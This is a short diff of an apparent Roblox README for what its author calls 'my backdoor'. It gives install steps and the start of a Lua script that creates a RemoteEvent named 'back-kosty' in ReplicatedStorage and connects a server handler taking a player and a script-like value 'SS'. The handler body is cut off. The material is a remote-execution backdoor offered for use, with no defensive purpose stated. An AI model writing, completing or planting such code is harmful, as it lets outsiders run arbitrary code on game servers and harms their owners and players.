@@ -2,6 +2,7 @@
 repository of my backdoor for test also this so epic :D
 # how to install?
 create in serverscriptservice the 2 scripts
+# stape number 1
 local backdoor = Instance.new("RemoteEvent", game.ReplicatedStorage)
 backdoor.Name = "back-kosty"
 backdoor.OnServerEvent:connect(function(player, SS)
